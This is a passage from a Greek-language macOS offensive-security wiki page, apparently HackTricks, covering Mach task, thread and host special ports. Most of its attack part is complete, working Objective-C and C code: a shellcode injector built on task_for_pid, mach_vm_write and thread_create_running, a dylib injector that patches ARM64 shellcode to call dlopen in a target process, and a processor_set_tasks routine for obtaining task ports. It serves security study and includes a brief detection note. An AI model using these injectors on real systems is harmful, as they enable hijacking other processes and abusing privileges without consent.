- `host_get_boot_info`: Λήψη του `machine_boot_info()`
- `host_priv_statistics`: Λήψη προνομιούχων στατιστικών
- `vm_allocate_cpm`: Εκχώρηση Contiguous Physical Memory
- `host_processors`: Δικαίωμα SEND προς τους host processors
- `mach_vm_wire`: Καθιστά τη μνήμη resident
- Καθώς ο **root** μπορεί να αποκτήσει πρόσβαση σε αυτό το δικαίωμα, θα μπορούσε να καλέσει τα **`host_set_[special/exception]_port[s]`** για να κάνει **hijack των host special ή exception ports**.

Είναι δυνατή η **εμφάνιση όλων των host special ports** εκτελώντας:
```bash
procexp all ports | grep "HSP"
```
### Ειδικές θύρες task

Πρόκειται για θύρες που προορίζονται για ευρέως γνωστές υπηρεσίες. Είναι δυνατή η λήψη/ορισμός τους καλώντας τις `task_[get/set]_special_port`. Μπορούν να βρεθούν στο `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
Από [εδώ](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):<sup>[[8]](#references)</sup>

- **TASK_KERNEL_PORT**\[task-self send right]: Το port που χρησιμοποιείται για τον έλεγχο αυτού του task. Χρησιμοποιείται για την αποστολή μηνυμάτων που επηρεάζουν το task. Αυτό είναι το port που επιστρέφεται από το **mach_task_self (see Task Ports below)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Το bootstrap port του task. Χρησιμοποιείται για την αποστολή μηνυμάτων που ζητούν την επιστροφή άλλων system service ports.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Το port που χρησιμοποιείται για την αίτηση πληροφοριών σχετικά με το host που το περιέχει. Αυτό είναι το port που επιστρέφεται από το **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Το port που ονομάζει την πηγή από την οποία αυτό το task αντλεί τη wired kernel memory του.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Το port που ονομάζει την πηγή από την οποία αυτό το task αντλεί την default memory managed memory του.

### Task Ports

Αρχικά, το Mach δεν είχε "processes", αλλά "tasks", τα οποία θεωρούνταν περισσότερο σαν containers από threads. Όταν το Mach συγχωνεύτηκε με το BSD, **κάθε task συσχετίστηκε με ένα BSD process**. Επομένως, κάθε BSD process διαθέτει τις λεπτομέρειες που χρειάζεται για να είναι process και κάθε Mach task διαθέτει επίσης την εσωτερική του λειτουργία (εκτός από το ανύπαρκτο pid 0, το οποίο είναι το `kernel_task`).

Υπάρχουν δύο ιδιαίτερα ενδιαφέρουσες functions που σχετίζονται με αυτό:<sup>[[7]](#references)</sup>

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Λήψη ενός SEND right για το task port του task που σχετίζεται με το `pid` και παράδοσή του στο καθορισμένο `target_task_port` (το οποίο είναι συνήθως το caller task που έχει χρησιμοποιήσει το `mach_task_self()`, αλλά μπορεί να είναι ένα SEND port πάνω σε διαφορετικό task.)
- `pid_for_task(task, &pid)`: Με δεδομένο ένα SEND right προς ένα task, εύρεση του PID με τον οποίο σχετίζεται αυτό το task.

Για την εκτέλεση ενεργειών μέσα στο task, το task χρειαζόταν ένα `SEND` right προς τον εαυτό του, καλώντας το `mach_task_self()` (το οποίο χρησιμοποιεί το `task_self_trap` (28)). Με αυτή την permission, ένα task μπορεί να εκτελέσει διάφορες ενέργειες, όπως:

- `task_threads`: Λήψη SEND right πάνω σε όλα τα task ports των threads του task
- `task_info`: Λήψη πληροφοριών σχετικά με ένα task
- `task_suspend/resume`: Αναστολή ή συνέχιση ενός task
- `task_[get/set]_special_port`
- `thread_create`: Δημιουργία ενός thread
- `task_[get/set]_state`: Έλεγχος της κατάστασης του task
- και περισσότερα μπορούν να βρεθούν στο [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Σημειώστε ότι με ένα SEND right πάνω σε ένα task port ενός **διαφορετικού task**, είναι δυνατή η εκτέλεση τέτοιων ενεργειών πάνω σε διαφορετικό task.

Επιπλέον, το task port είναι επίσης το **`vm_map`** port, το οποίο επιτρέπει σε έναν caller να **διαβάζει και να χειρίζεται τη memory** μέσα σε ένα task, με functions όπως οι `vm_read()` και `vm_write()`. Αυτό σημαίνει ότι ένα task με SEND rights πάνω στο task port ενός άλλου task μπορεί να **εισάγει code σε αυτό το task**.

Να θυμάστε ότι επειδή ο **kernel είναι επίσης task**, αν κάποιος καταφέρει να αποκτήσει **SEND permissions** πάνω στο **`kernel_task`**, θα μπορεί να κάνει τον kernel να εκτελέσει οτιδήποτε (jailbreaks).

- Κλήση του `mach_task_self()` για **λήψη του name** αυτού του port για το caller task. Αυτό το port γίνεται μόνο **inherited** μέσω του **`exec()`**· ένα νέο task που δημιουργείται με `fork()` λαμβάνει νέο task port (ως ειδική περίπτωση, ένα task λαμβάνει επίσης νέο task port μετά το `exec()` σε ένα suid binary). Ο μόνος τρόπος για να γίνει spawn ενός task και να ληφθεί το port του είναι η εκτέλεση του ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) κατά τη διάρκεια ενός `fork()`.
- Αυτοί είναι οι περιορισμοί για την πρόσβαση στο port (από το `macos_task_policy` του binary `AppleMobileFileIntegrity`):
- Αν η app διαθέτει το **`com.apple.security.get-task-allow` entitlement**, processes από τον **ίδιο user μπορούν να έχουν πρόσβαση στο task port** (συνήθως προστίθεται από το Xcode για debugging). Η διαδικασία **notarization** δεν το επιτρέπει σε production releases.
- Apps με το **`com.apple.system-task-ports`** entitlement μπορούν να αποκτήσουν το **task port οποιουδήποτε** process, εκτός από τον kernel. Σε παλαιότερες versions ονομαζόταν **`task_for_pid-allow`**. Αυτό παρέχεται μόνο σε Apple applications.
- Το **root μπορεί να έχει πρόσβαση στα task ports** applications που **δεν** έχουν γίνει compiled με **hardened** runtime (και δεν προέρχονται από την Apple).

**Το task name port:** Μια unprivileged version του _task port_. Αναφέρεται στο task, αλλά δεν επιτρέπει τον έλεγχό του. Το μόνο πράγμα που φαίνεται να είναι διαθέσιμο μέσω αυτού είναι το `task_info()`.

### Thread Ports

Τα threads έχουν επίσης συσχετισμένα ports, τα οποία είναι ορατά από το task που καλεί το **`task_threads`** και από τον processor μέσω του `processor_set_threads`. Ένα SEND right προς το thread port επιτρέπει τη χρήση των functions από το `thread_act` subsystem, όπως:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Οποιοδήποτε thread μπορεί να λάβει αυτό το port καλώντας το **`mach_thread_sef`**.

### Shellcode Injection σε thread μέσω Task port

Μπορείτε να πάρετε shellcode από:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Κάντε **Compile** το προηγούμενο πρόγραμμα και προσθέστε τα **entitlements**, ώστε να μπορείτε να κάνετε inject κώδικα με τον ίδιο χρήστη (διαφορετικά θα χρειαστεί να χρησιμοποιήσετε **sudo**).<sup>[[3]](#references)</sup>

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Για να λειτουργήσει αυτό στο iOS χρειάζεστε το entitlement `dynamic-codesigning`, ώστε να μπορείτε να καταστήσετε εκτελέσιμη μια εγγράψιμη μνήμη.

### Dylib Injection σε thread μέσω Task port

Στο macOS τα **threads** μπορούν να τροποποιηθούν μέσω **Mach** ή χρησιμοποιώντας το **posix `pthread` api**. Το thread που δημιουργήσαμε στο προηγούμενο injection δημιουργήθηκε με χρήση του Mach api, επομένως **δεν είναι συμβατό με το posix**.

Ήταν δυνατή η **εισαγωγή ενός απλού shellcode** για την εκτέλεση μιας εντολής, επειδή **δεν χρειαζόταν να λειτουργεί με apis συμβατά με το posix**, αλλά μόνο με το Mach. **Πιο σύνθετα injections** θα απαιτούσαν το **thread** να είναι επίσης **συμβατό με το posix**.

Επομένως, για να **βελτιωθεί το thread**, θα πρέπει να καλέσει το **`pthread_create_from_mach_thread`**, το οποίο θα **δημιουργήσει ένα έγκυρο pthread**. Στη συνέχεια, αυτό το νέο pthread θα μπορούσε να **καλέσει το dlopen** για να **φορτώσει ένα dylib** από το σύστημα. Έτσι, αντί να γράφεται νέο shellcode για την εκτέλεση διαφορετικών ενεργειών, είναι δυνατή η φόρτωση custom libraries.<sup>[[2]](#references)</sup>

Μπορείτε να βρείτε **παραδείγματα dylibs** εδώ (για παράδειγμα, αυτό που δημιουργεί ένα log και στη συνέχεια μπορείτε να το παρακολουθήσετε):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Σε αυτή την τεχνική γίνεται hijacking ενός thread της διεργασίας:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Ανίχνευση Task Port Injection

Η κλήση των `task_for_pid` ή `thread_create_*` αυξάνει έναν μετρητή στη δομή task του kernel, ο οποίος μπορεί να προσπελαστεί από user mode με την κλήση `task_info(task, TASK_EXTMOD_INFO, ...)`

## Exception Ports

Όταν προκύπτει ένα exception σε ένα thread, αυτό το exception αποστέλλεται στο designated exception port του thread. Αν το thread δεν το χειριστεί, τότε αποστέλλεται στα exception ports του task. Αν το task δεν το χειριστεί, τότε αποστέλλεται στο host port, το οποίο διαχειρίζεται το launchd, όπου και γίνεται acknowledge. Αυτό ονομάζεται exception triage.

Σημειώστε ότι στο τέλος, συνήθως, αν το report δεν έχει γίνει σωστά handle, θα καταλήξει στον daemon ReportCrash. Ωστόσο, είναι πιθανό ένα άλλο thread στο ίδιο task να διαχειριστεί το exception· αυτό κάνει το crash reporting tool `PLCreashReporter`.

## Άλλα Objects

### Clock

Οποιοσδήποτε user μπορεί να προσπελάσει πληροφορίες σχετικά με το clock, ωστόσο για να ρυθμίσει την ώρα ή να τροποποιήσει άλλες ρυθμίσεις απαιτούνται δικαιώματα root.

Για τη λήψη πληροφοριών είναι δυνατή η κλήση functions από το `clock` subsystem, όπως οι `clock_get_time`, `clock_get_attributtes` ή `clock_alarm`\
Για την τροποποίηση τιμών μπορεί να χρησιμοποιηθεί το `clock_priv` subsystem με functions όπως οι `clock_set_time` και `clock_set_attributes`

### Processors και Processor Set

Τα processor APIs επιτρέπουν τον έλεγχο ενός μεμονωμένου logical processor μέσω functions όπως οι `processor_start`, `processor_exit`, `processor_info` και `processor_get_assignment`.

Επιπλέον, τα APIs του **processor set** παρέχουν έναν τρόπο ομαδοποίησης πολλών processors σε ένα group. Είναι δυνατή η ανάκτηση του default processor set με την κλήση του **`processor_set_default`**.\
Αυτά είναι μερικά ενδιαφέροντα APIs για αλληλεπίδραση με το processor set:

- `processor_set_statistics`
- `processor_set_tasks`: Επιστρέφει έναν array από send rights για όλα τα tasks μέσα στο processor set
- `processor_set_threads`: Επιστρέφει έναν array από send rights για όλα τα threads μέσα στο processor set
- `processor_set_stack_usage`
- `processor_set_info`

Όπως αναφέρεται σε [**αυτό το post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), στο παρελθόν αυτό επέτρεπε την παράκαμψη της προστασίας που αναφέρθηκε προηγουμένως, ώστε να ληφθούν task ports σε άλλα processes και να ελεγχθούν μέσω της κλήσης του **`processor_set_tasks`**, λαμβάνοντας ένα host port σε κάθε process.<sup>[[10]](#references)</sup>\
Σήμερα απαιτούνται δικαιώματα root για τη χρήση αυτής της function και υπάρχει προστασία, επομένως θα μπορείτε να λάβετε αυτά τα ports μόνο σε unprotected processes.<sup>[[10]](#references)</sup>

Μπορείτε να το δοκιμάσετε με:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Main part of the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

